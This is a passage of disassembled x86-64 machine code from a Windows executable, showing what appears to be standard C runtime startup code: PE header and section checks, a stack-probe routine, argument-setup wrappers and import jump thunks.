   140002cc9:	66 41 81 38 4d 5a    	cmpw   $0x5a4d,(%r8)
   140002ccf:	75 0f                	jne    0x140002ce0
   140002cd1:	49 63 50 3c          	movslq 0x3c(%r8),%rdx
   140002cd5:	4c 01 c2             	add    %r8,%rdx
   140002cd8:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   140002cde:	74 08                	je     0x140002ce8
   140002ce0:	c3                   	ret
   140002ce1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002ce8:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   140002cee:	75 f0                	jne    0x140002ce0
   140002cf0:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   140002cf5:	66 45 85 c0          	test   %r8w,%r8w
   140002cf9:	74 e5                	je     0x140002ce0
   140002cfb:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   140002cff:	48 8d 44 02 18       	lea    0x18(%rdx,%rax,1),%rax
   140002d04:	41 8d 50 ff          	lea    -0x1(%r8),%edx
   140002d08:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140002d0c:	48 8d 54 d0 28       	lea    0x28(%rax,%rdx,8),%rdx
   140002d11:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002d18:	00 00 00 00 
   140002d1c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002d20:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   140002d24:	74 09                	je     0x140002d2f
   140002d26:	48 85 c9             	test   %rcx,%rcx
   140002d29:	74 b5                	je     0x140002ce0
   140002d2b:	48 83 e9 01          	sub    $0x1,%rcx
   140002d2f:	48 83 c0 28          	add    $0x28,%rax
   140002d33:	48 39 c2             	cmp    %rax,%rdx
   140002d36:	75 e8                	jne    0x140002d20
   140002d38:	31 c0                	xor    %eax,%eax
   140002d3a:	c3                   	ret
   140002d3b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d40:	48 8b 05 99 27 00 00 	mov    0x2799(%rip),%rax        # 0x1400054e0
   140002d47:	31 d2                	xor    %edx,%edx
   140002d49:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140002d4e:	75 0f                	jne    0x140002d5f
   140002d50:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140002d54:	48 01 c1             	add    %rax,%rcx
   140002d57:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140002d5d:	74 09                	je     0x140002d68
   140002d5f:	48 89 d0             	mov    %rdx,%rax
   140002d62:	c3                   	ret
   140002d63:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002d68:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   140002d6e:	48 0f 44 d0          	cmove  %rax,%rdx
   140002d72:	48 89 d0             	mov    %rdx,%rax
   140002d75:	c3                   	ret
   140002d76:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002d7d:	00 00 00 
   140002d80:	48 8b 15 59 27 00 00 	mov    0x2759(%rip),%rdx        # 0x1400054e0
   140002d87:	31 c0                	xor    %eax,%eax
   140002d89:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   140002d8e:	75 10                	jne    0x140002da0
   140002d90:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   140002d94:	49 01 d0             	add    %rdx,%r8
   140002d97:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   140002d9e:	74 08                	je     0x140002da8
   140002da0:	c3                   	ret
   140002da1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002da8:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   140002daf:	75 ef                	jne    0x140002da0
   140002db1:	45 0f b7 48 06       	movzwl 0x6(%r8),%r9d
   140002db6:	66 45 85 c9          	test   %r9w,%r9w
   140002dba:	74 e4                	je     0x140002da0
   140002dbc:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   140002dc1:	48 29 d1             	sub    %rdx,%rcx
   140002dc4:	41 8d 51 ff          	lea    -0x1(%r9),%edx
   140002dc8:	48 8d 14 92          	lea    (%rdx,%rdx,4),%rdx
   140002dcc:	49 8d 44 00 18       	lea    0x18(%r8,%rax,1),%rax
   140002dd1:	4c 8d 4c d0 28       	lea    0x28(%rax,%rdx,8),%r9
   140002dd6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140002ddd:	00 00 00 
   140002de0:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140002de4:	4c 89 c2             	mov    %r8,%rdx
   140002de7:	4c 39 c1             	cmp    %r8,%rcx
   140002dea:	72 08                	jb     0x140002df4
   140002dec:	03 50 08             	add    0x8(%rax),%edx
   140002def:	48 39 d1             	cmp    %rdx,%rcx
   140002df2:	72 0c                	jb     0x140002e00
   140002df4:	48 83 c0 28          	add    $0x28,%rax
   140002df8:	4c 39 c8             	cmp    %r9,%rax
   140002dfb:	75 e3                	jne    0x140002de0
   140002dfd:	31 c0                	xor    %eax,%eax
   140002dff:	c3                   	ret
   140002e00:	8b 40 24             	mov    0x24(%rax),%eax
   140002e03:	f7 d0                	not    %eax
   140002e05:	c1 e8 1f             	shr    $0x1f,%eax
   140002e08:	c3                   	ret
   140002e09:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002e10:	4c 8b 1d c9 26 00 00 	mov    0x26c9(%rip),%r11        # 0x1400054e0
   140002e17:	41 89 c8             	mov    %ecx,%r8d
   140002e1a:	31 c9                	xor    %ecx,%ecx
   140002e1c:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
   140002e22:	75 0f                	jne    0x140002e33
   140002e24:	49 63 53 3c          	movslq 0x3c(%r11),%rdx
   140002e28:	4c 01 da             	add    %r11,%rdx
   140002e2b:	81 3a 50 45 00 00    	cmpl   $0x4550,(%rdx)
   140002e31:	74 0d                	je     0x140002e40
   140002e33:	48 89 c8             	mov    %rcx,%rax
   140002e36:	c3                   	ret
   140002e37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002e3e:	00 00 
   140002e40:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   140002e46:	75 eb                	jne    0x140002e33
   140002e48:	8b 82 90 00 00 00    	mov    0x90(%rdx),%eax
   140002e4e:	85 c0                	test   %eax,%eax
   140002e50:	74 e1                	je     0x140002e33
   140002e52:	44 0f b7 4a 06       	movzwl 0x6(%rdx),%r9d
   140002e57:	66 45 85 c9          	test   %r9w,%r9w
   140002e5b:	74 d6                	je     0x140002e33
   140002e5d:	0f b7 4a 14          	movzwl 0x14(%rdx),%ecx
   140002e61:	48 8d 54 0a 18       	lea    0x18(%rdx,%rcx,1),%rdx
   140002e66:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   140002e6a:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   140002e6e:	4c 8d 54 ca 28       	lea    0x28(%rdx,%rcx,8),%r10
   140002e73:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002e7a:	00 00 00 00 
   140002e7e:	66 90                	xchg   %ax,%ax
   140002e80:	44 8b 4a 0c          	mov    0xc(%rdx),%r9d
   140002e84:	4c 89 c9             	mov    %r9,%rcx
   140002e87:	4c 39 c8             	cmp    %r9,%rax
   140002e8a:	72 08                	jb     0x140002e94
   140002e8c:	03 4a 08             	add    0x8(%rdx),%ecx
   140002e8f:	48 39 c8             	cmp    %rcx,%rax
   140002e92:	72 14                	jb     0x140002ea8
   140002e94:	48 83 c2 28          	add    $0x28,%rdx
   140002e98:	4c 39 d2             	cmp    %r10,%rdx
   140002e9b:	75 e3                	jne    0x140002e80
   140002e9d:	31 c9                	xor    %ecx,%ecx
   140002e9f:	48 89 c8             	mov    %rcx,%rax
   140002ea2:	c3                   	ret
   140002ea3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002ea8:	4c 01 d8             	add    %r11,%rax
   140002eab:	eb 0b                	jmp    0x140002eb8
   140002ead:	0f 1f 00             	nopl   (%rax)
   140002eb0:	41 83 e8 01          	sub    $0x1,%r8d
   140002eb4:	48 83 c0 14          	add    $0x14,%rax
   140002eb8:	8b 48 04             	mov    0x4(%rax),%ecx
   140002ebb:	85 c9                	test   %ecx,%ecx
   140002ebd:	75 07                	jne    0x140002ec6
   140002ebf:	8b 50 0c             	mov    0xc(%rax),%edx
   140002ec2:	85 d2                	test   %edx,%edx
   140002ec4:	74 d7                	je     0x140002e9d
   140002ec6:	45 85 c0             	test   %r8d,%r8d
   140002ec9:	7f e5                	jg     0x140002eb0
   140002ecb:	8b 48 0c             	mov    0xc(%rax),%ecx
   140002ece:	4c 01 d9             	add    %r11,%rcx
   140002ed1:	48 89 c8             	mov    %rcx,%rax
   140002ed4:	c3                   	ret
   140002ed5:	90                   	nop
   140002ed6:	90                   	nop
   140002ed7:	90                   	nop
   140002ed8:	90                   	nop
   140002ed9:	90                   	nop
   140002eda:	90                   	nop
   140002edb:	90                   	nop
   140002edc:	90                   	nop
   140002edd:	90                   	nop
   140002ede:	90                   	nop
   140002edf:	90                   	nop
   140002ee0:	51                   	push   %rcx
   140002ee1:	50                   	push   %rax
   140002ee2:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002ee8:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140002eed:	72 19                	jb     0x140002f08
   140002eef:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002ef6:	48 83 09 00          	orq    $0x0,(%rcx)
   140002efa:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   140002f00:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002f06:	77 e7                	ja     0x140002eef
   140002f08:	48 29 c1             	sub    %rax,%rcx
   140002f0b:	48 83 09 00          	orq    $0x0,(%rcx)
   140002f0f:	58                   	pop    %rax
   140002f10:	59                   	pop    %rcx
   140002f11:	c3                   	ret
   140002f12:	90                   	nop
   140002f13:	90                   	nop
   140002f14:	90                   	nop
   140002f15:	90                   	nop
   140002f16:	90                   	nop
   140002f17:	90                   	nop
   140002f18:	90                   	nop
   140002f19:	90                   	nop
   140002f1a:	90                   	nop
   140002f1b:	90                   	nop
   140002f1c:	90                   	nop
   140002f1d:	90                   	nop
   140002f1e:	90                   	nop
   140002f1f:	90                   	nop
   140002f20:	48 83 ec 38          	sub    $0x38,%rsp
   140002f24:	45 31 c9             	xor    %r9d,%r9d
   140002f27:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   140002f2c:	49 89 d0             	mov    %rdx,%r8
   140002f2f:	48 89 ca             	mov    %rcx,%rdx
   140002f32:	31 c9                	xor    %ecx,%ecx
   140002f34:	e8 df 02 00 00       	call   0x140003218
   140002f39:	48 83 c4 38          	add    $0x38,%rsp
   140002f3d:	c3                   	ret
   140002f3e:	90                   	nop
   140002f3f:	90                   	nop
   140002f40:	48 83 ec 48          	sub    $0x48,%rsp
   140002f44:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140002f49:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   140002f4e:	49 89 d0             	mov    %rdx,%r8
   140002f51:	48 89 ca             	mov    %rcx,%rdx
   140002f54:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002f59:	31 c9                	xor    %ecx,%ecx
   140002f5b:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140002f60:	45 31 c9             	xor    %r9d,%r9d
   140002f63:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140002f68:	e8 ab 02 00 00       	call   0x140003218
   140002f6d:	48 83 c4 48          	add    $0x48,%rsp
   140002f71:	c3                   	ret
   140002f72:	90                   	nop
   140002f73:	90                   	nop
   140002f74:	90                   	nop
   140002f75:	90                   	nop
   140002f76:	90                   	nop
   140002f77:	90                   	nop
   140002f78:	90                   	nop
   140002f79:	90                   	nop
   140002f7a:	90                   	nop
   140002f7b:	90                   	nop
   140002f7c:	90                   	nop
   140002f7d:	90                   	nop
   140002f7e:	90                   	nop
   140002f7f:	90                   	nop
   140002f80:	31 c0                	xor    %eax,%eax
   140002f82:	c3                   	ret
   140002f83:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140002f8a:	00 00 00 00 
   140002f8e:	66 90                	xchg   %ax,%ax
   140002f90:	55                   	push   %rbp
   140002f91:	57                   	push   %rdi
   140002f92:	56                   	push   %rsi
   140002f93:	53                   	push   %rbx
   140002f94:	48 83 ec 28          	sub    $0x28,%rsp
   140002f98:	44 89 cd             	mov    %r9d,%ebp
   140002f9b:	48 89 d6             	mov    %rdx,%rsi
   140002f9e:	4c 89 c3             	mov    %r8,%rbx
   140002fa1:	48 89 cf             	mov    %rcx,%rdi
   140002fa4:	e8 df 02 00 00       	call   0x140003288
   140002fa9:	83 fd 01             	cmp    $0x1,%ebp
   140002fac:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002fb1:	83 d9 ff             	sbb    $0xffffffff,%ecx
   140002fb4:	e8 a7 02 00 00       	call   0x140003260
   140002fb9:	e8 7a 02 00 00       	call   0x140003238
   140002fbe:	8b 00                	mov    (%rax),%eax
   140002fc0:	89 07                	mov    %eax,(%rdi)
   140002fc2:	e8 79 02 00 00       	call   0x140003240
   140002fc7:	48 8b 00             	mov    (%rax),%rax
   140002fca:	48 89 06             	mov    %rax,(%rsi)
   140002fcd:	e8 4e 03 00 00       	call   0x140003320
   140002fd2:	48 83 7c 24 70 00    	cmpq   $0x0,0x70(%rsp)
   140002fd8:	48 8b 00             	mov    (%rax),%rax
   140002fdb:	48 89 03             	mov    %rax,(%rbx)
   140002fde:	74 0c                	je     0x140002fec
   140002fe0:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140002fe5:	8b 08                	mov    (%rax),%ecx
   140002fe7:	e8 04 03 00 00       	call   0x1400032f0
   140002fec:	31 c0                	xor    %eax,%eax
   140002fee:	48 83 c4 28          	add    $0x28,%rsp
   140002ff2:	5b                   	pop    %rbx
   140002ff3:	5e                   	pop    %rsi
   140002ff4:	5f                   	pop    %rdi
   140002ff5:	5d                   	pop    %rbp
   140002ff6:	c3                   	ret
   140002ff7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002ffe:	00 00 
   140003000:	55                   	push   %rbp
   140003001:	57                   	push   %rdi
   140003002:	56                   	push   %rsi
   140003003:	53                   	push   %rbx
   140003004:	48 83 ec 28          	sub    $0x28,%rsp
   140003008:	44 89 cd             	mov    %r9d,%ebp
   14000300b:	48 89 d6             	mov    %rdx,%rsi
   14000300e:	4c 89 c3             	mov    %r8,%rbx
   140003011:	48 89 cf             	mov    %rcx,%rdi
   140003014:	e8 77 02 00 00       	call   0x140003290
   140003019:	83 fd 01             	cmp    $0x1,%ebp
   14000301c:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003021:	83 d9 ff             	sbb    $0xffffffff,%ecx
   140003024:	e8 3f 02 00 00       	call   0x140003268
   140003029:	e8 0a 02 00 00       	call   0x140003238
   14000302e:	8b 00                	mov    (%rax),%eax
   140003030:	89 07                	mov    %eax,(%rdi)
   140003032:	e8 11 02 00 00       	call   0x140003248
   140003037:	48 8b 00             	mov    (%rax),%rax
   14000303a:	48 89 06             	mov    %rax,(%rsi)
   14000303d:	e8 e6 02 00 00       	call   0x140003328
   140003042:	48 83 7c 24 70 00    	cmpq   $0x0,0x70(%rsp)
   140003048:	48 8b 00             	mov    (%rax),%rax
   14000304b:	48 89 03             	mov    %rax,(%rbx)
   14000304e:	74 0c                	je     0x14000305c
   140003050:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003055:	8b 08                	mov    (%rax),%ecx
   140003057:	e8 94 02 00 00       	call   0x1400032f0
   14000305c:	31 c0                	xor    %eax,%eax
   14000305e:	48 83 c4 28          	add    $0x28,%rsp
   140003062:	5b                   	pop    %rbx
   140003063:	5e                   	pop    %rsi
   140003064:	5f                   	pop    %rdi
   140003065:	5d                   	pop    %rbp
   140003066:	c3                   	ret
   140003067:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000306e:	00 00 
   140003070:	53                   	push   %rbx
   140003071:	48 83 ec 20          	sub    $0x20,%rsp
   140003075:	48 89 cb             	mov    %rcx,%rbx
   140003078:	e8 fb 01 00 00       	call   0x140003278
   14000307d:	85 c0                	test   %eax,%eax
   14000307f:	b8 00 00 00 00       	mov    $0x0,%eax
   140003084:	48 0f 44 c3          	cmove  %rbx,%rax
   140003088:	48 83 c4 20          	add    $0x20,%rsp
   14000308c:	5b                   	pop    %rbx
   14000308d:	c3                   	ret
   14000308e:	66 90                	xchg   %ax,%ax
   140003090:	48 8b 05 e9 24 00 00 	mov    0x24e9(%rip),%rax        # 0x140005580
   140003097:	80 38 00             	cmpb   $0x0,(%rax)
   14000309a:	74 04                	je     0x1400030a0
   14000309c:	31 c0                	xor    %eax,%eax
   14000309e:	c3                   	ret
   14000309f:	90                   	nop
   1400030a0:	e9 cb 01 00 00       	jmp    0x140003270
   1400030a5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400030ac:	00 00 00 00 
   1400030b0:	48 83 ec 28          	sub    $0x28,%rsp
   1400030b4:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   1400030b8:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400030bd:	e8 3e 01 00 00       	call   0x140003200
   1400030c2:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   1400030c7:	48 8d 15 c2 23 00 00 	lea    0x23c2(%rip),%rdx        # 0x140005490
   1400030ce:	48 89 c1             	mov    %rax,%rcx
   1400030d1:	e8 6a fe ff ff       	call   0x140002f40
   1400030d6:	b9 ff 00 00 00       	mov    $0xff,%ecx
   1400030db:	e8 a0 01 00 00       	call   0x140003280
   1400030e0:	90                   	nop
   1400030e1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400030e8:	00 00 00 00 
   1400030ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400030f0:	48 83 ec 48          	sub    $0x48,%rsp
   1400030f4:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400030f9:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
   1400030fe:	49 89 d0             	mov    %rdx,%r8
   140003101:	48 89 ca             	mov    %rcx,%rdx
   140003104:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003109:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000310e:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140003113:	45 31 c9             	xor    %r9d,%r9d
   140003116:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000311b:	e8 00 01 00 00       	call   0x140003220
   140003120:	48 83 c4 48          	add    $0x48,%rsp
   140003124:	c3                   	ret
   140003125:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000312c:	00 00 00 00 
   140003130:	48 83 ec 28          	sub    $0x28,%rsp
   140003134:	48 8b 05 f5 23 00 00 	mov    0x23f5(%rip),%rax        # 0x140005530
   14000313b:	ff 10                	call   *(%rax)
   14000313d:	e8 7e 00 00 00       	call   0x1400031c0
   140003142:	48 89 05 67 0f 00 00 	mov    %rax,0xf67(%rip)        # 0x1400040b0
   140003149:	e8 6a 00 00 00       	call   0x1400031b8
   14000314e:	48 89 05 53 0f 00 00 	mov    %rax,0xf53(%rip)        # 0x1400040a8
   140003155:	e8 56 00 00 00       	call   0x1400031b0
   14000315a:	48 89 05 3f 0f 00 00 	mov    %rax,0xf3f(%rip)        # 0x1400040a0
   140003161:	48 83 c4 28          	add    $0x28,%rsp
   140003165:	c3                   	ret
   140003166:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000316d:	00 00 00 
   140003170:	48 83 ec 28          	sub    $0x28,%rsp
   140003174:	48 8b 05 b5 23 00 00 	mov    0x23b5(%rip),%rax        # 0x140005530
   14000317b:	ff 10                	call   *(%rax)
   14000317d:	e8 3e 00 00 00       	call   0x1400031c0
   140003182:	48 89 05 27 0f 00 00 	mov    %rax,0xf27(%rip)        # 0x1400040b0
   140003189:	e8 2a 00 00 00       	call   0x1400031b8
   14000318e:	48 89 05 13 0f 00 00 	mov    %rax,0xf13(%rip)        # 0x1400040a8
   140003195:	e8 16 00 00 00       	call   0x1400031b0
   14000319a:	48 89 05 ff 0e 00 00 	mov    %rax,0xeff(%rip)        # 0x1400040a0
   1400031a1:	48 83 c4 28          	add    $0x28,%rsp
   1400031a5:	c3                   	ret
   1400031a6:	90                   	nop
   1400031a7:	90                   	nop
   1400031a8:	90                   	nop
   1400031a9:	90                   	nop
   1400031aa:	90                   	nop
   1400031ab:	90                   	nop
   1400031ac:	90                   	nop
   1400031ad:	90                   	nop
   1400031ae:	90                   	nop
   1400031af:	90                   	nop
   1400031b0:	ff 25 b2 64 00 00    	jmp    *0x64b2(%rip)        # 0x140009668
   1400031b6:	90                   	nop
   1400031b7:	90                   	nop
   1400031b8:	ff 25 b2 64 00 00    	jmp    *0x64b2(%rip)        # 0x140009670
   1400031be:	90                   	nop
   1400031bf:	90                   	nop
   1400031c0:	ff 25 b2 64 00 00    	jmp    *0x64b2(%rip)        # 0x140009678
   1400031c6:	90                   	nop
   1400031c7:	90                   	nop
   1400031c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400031cf:	00 
   1400031d0:	ff 25 5a 64 00 00    	jmp    *0x645a(%rip)        # 0x140009630
   1400031d6:	90                   	nop
   1400031d7:	90                   	nop
   1400031d8:	ff 25 5a 64 00 00    	jmp    *0x645a(%rip)        # 0x140009638
   1400031de:	90                   	nop
   1400031df:	90                   	nop
   1400031e0:	ff 25 5a 64 00 00    	jmp    *0x645a(%rip)        # 0x140009640
   1400031e6:	90                   	nop
   1400031e7:	90                   	nop
   1400031e8:	ff 25 5a 64 00 00    	jmp    *0x645a(%rip)        # 0x140009648
   1400031ee:	90                   	nop
   1400031ef:	90                   	nop
   1400031f0:	ff 25 5a 64 00 00    	jmp    *0x645a(%rip)        # 0x140009650
   1400031f6:	90                   	nop
   1400031f7:	90                   	nop
   1400031f8:	ff 25 5a 64 00 00    	jmp    *0x645a(%rip)        # 0x140009658
   1400031fe:	90                   	nop
   1400031ff:	90                   	nop
   140003200:	ff 25 f2 63 00 00    	jmp    *0x63f2(%rip)        # 0x1400095f8
   140003206:	90                   	nop
   140003207:	90                   	nop
   140003208:	ff 25 f2 63 00 00    	jmp    *0x63f2(%rip)        # 0x140009600
   14000320e:	90                   	nop
   14000320f:	90                   	nop
   140003210:	ff 25 f2 63 00 00    	jmp    *0x63f2(%rip)        # 0x140009608
   140003216:	90                   	nop
   140003217:	90                   	nop
   140003218:	ff 25 f2 63 00 00    	jmp    *0x63f2(%rip)        # 0x140009610
   14000321e:	90                   	nop
   14000321f:	90                   	nop
   140003220:	ff 25 f2 63 00 00    	jmp    *0x63f2(%rip)        # 0x140009618
   140003226:	90                   	nop
   140003227:	90                   	nop
   140003228:	ff 25 f2 63 00 00    	jmp    *0x63f2(%rip)        # 0x140009620
   14000322e:	90                   	nop
   14000322f:	90                   	nop
   140003230:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x140009560
   140003236:	90                   	nop
   140003237:	90                   	nop
   140003238:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x140009568
   14000323e:	90                   	nop
   14000323f:	90                   	nop
   140003240:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x140009570
   140003246:	90                   	nop
   140003247:	90                   	nop
   140003248:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x140009578
   14000324e:	90                   	nop
   14000324f:	90                   	nop
   140003250:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x140009580
   140003256:	90                   	nop
   140003257:	90                   	nop
   140003258:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x140009588
   14000325e:	90                   	nop
   14000325f:	90                   	nop
   140003260:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x140009590
   140003266:	90                   	nop
   140003267:	90                   	nop
   140003268:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x140009598
   14000326e:	90                   	nop
   14000326f:	90                   	nop
   140003270:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095a0
   140003276:	90                   	nop
   140003277:	90                   	nop
   140003278:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095a8
   14000327e:	90                   	nop
   14000327f:	90                   	nop
   140003280:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095b0
   140003286:	90                   	nop
   140003287:	90                   	nop
   140003288:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095b8
   14000328e:	90                   	nop
   14000328f:	90                   	nop
   140003290:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095c0
   140003296:	90                   	nop
   140003297:	90                   	nop
   140003298:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095c8
   14000329e:	90                   	nop
   14000329f:	90                   	nop
   1400032a0:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095d0
   1400032a6:	90                   	nop
   1400032a7:	90                   	nop
   1400032a8:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095d8
   1400032ae:	90                   	nop
   1400032af:	90                   	nop
   1400032b0:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095e0
   1400032b6:	90                   	nop
   1400032b7:	90                   	nop
   1400032b8:	ff 25 2a 63 00 00    	jmp    *0x632a(%rip)        # 0x1400095e8
   1400032be:	90                   	nop
   1400032bf:	90                   	nop
   1400032c0:	ff 25 82 62 00 00    	jmp    *0x6282(%rip)        # 0x140009548
   1400032c6:	90                   	nop
   1400032c7:	90                   	nop
   1400032c8:	ff 25 82 62 00 00    	jmp    *0x6282(%rip)        # 0x140009550
   1400032ce:	90                   	nop
   1400032cf:	90                   	nop
   1400032d0:	ff 25 62 62 00 00    	jmp    *0x6262(%rip)        # 0x140009538
   1400032d6:	90                   	nop
   1400032d7:	90                   	nop
   1400032d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400032df:	00 
   1400032e0:	ff 25 42 62 00 00    	jmp    *0x6242(%rip)        # 0x140009528
   1400032e6:	90                   	nop
   1400032e7:	90                   	nop
   1400032e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400032ef:	00 
   1400032f0:	ff 25 02 62 00 00    	jmp    *0x6202(%rip)        # 0x1400094f8
   1400032f6:	90                   	nop
   1400032f7:	90                   	nop
   1400032f8:	ff 25 02 62 00 00    	jmp    *0x6202(%rip)        # 0x140009500
   1400032fe:	90                   	nop
   1400032ff:	90                   	nop
   140003300:	ff 25 02 62 00 00    	jmp    *0x6202(%rip)        # 0x140009508
   140003306:	90                   	nop
   140003307:	90                   	nop
   140003308:	ff 25 02 62 00 00    	jmp    *0x6202(%rip)        # 0x140009510
   14000330e:	90                   	nop
   14000330f:	90                   	nop
   140003310:	ff 25 02 62 00 00    	jmp    *0x6202(%rip)        # 0x140009518
   140003316:	90                   	nop
   140003317:	90                   	nop
   140003318:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000331f:	00 
   140003320:	ff 25 ba 61 00 00    	jmp    *0x61ba(%rip)        # 0x1400094e0
   140003326:	90                   	nop
   140003327:	90                   	nop
   140003328:	ff 25 ba 61 00 00    	jmp    *0x61ba(%rip)        # 0x1400094e8
   14000332e:	90                   	nop
   14000332f:	90                   	nop
   140003330:	ff 25 9a 61 00 00    	jmp    *0x619a(%rip)        # 0x1400094d0
   140003336:	90                   	nop
   140003337:	90                   	nop
   140003338:	ff 25 8a 61 00 00    	jmp    *0x618a(%rip)        # 0x1400094c8
   14000333e:	90                   	nop
   14000333f:	90                   	nop
   140003340:	ff 25 7a 61 00 00    	jmp    *0x617a(%rip)        # 0x1400094c0
   140003346:	90                   	nop
   140003347:	90                   	nop
   140003348:	ff 25 6a 61 00 00    	jmp    *0x616a(%rip)        # 0x1400094b8
   14000334e:	90                   	nop
   14000334f:	90                   	nop
   140003350:	ff 25 5a 61 00 00    	jmp    *0x615a(%rip)        # 0x1400094b0
   140003356:	90                   	nop
   140003357:	90                   	nop
   140003358:	ff 25 4a 61 00 00    	jmp    *0x614a(%rip)        # 0x1400094a8
   14000335e:	90                   	nop
   14000335f:	90                   	nop
   140003360:	ff 25 3a 61 00 00    	jmp    *0x613a(%rip)        # 0x1400094a0
   140003366:	90                   	nop
   140003367:	90                   	nop
   140003368:	ff 25 2a 61 00 00    	jmp    *0x612a(%rip)        # 0x140009498
   14000336e:	90                   	nop
   14000336f:	90                   	nop
   140003370:	ff 25 1a 61 00 00    	jmp    *0x611a(%rip)        # 0x140009490
   140003376:	90                   	nop
   140003377:	90                   	nop
   140003378:	ff 25 0a 61 00 00    	jmp    *0x610a(%rip)        # 0x140009488
   14000337e:	90                   	nop
   14000337f:	90                   	nop
   140003380:	ff 25 fa 60 00 00    	jmp    *0x60fa(%rip)        # 0x140009480
   140003386:	90                   	nop
   140003387:	90                   	nop
   140003388:	ff 25 ea 60 00 00    	jmp    *0x60ea(%rip)        # 0x140009478
   14000338e:	90                   	nop
   14000338f:	90                   	nop
   140003390:	ff 25 da 60 00 00    	jmp    *0x60da(%rip)        # 0x140009470
   140003396:	90                   	nop
   140003397:	90                   	nop
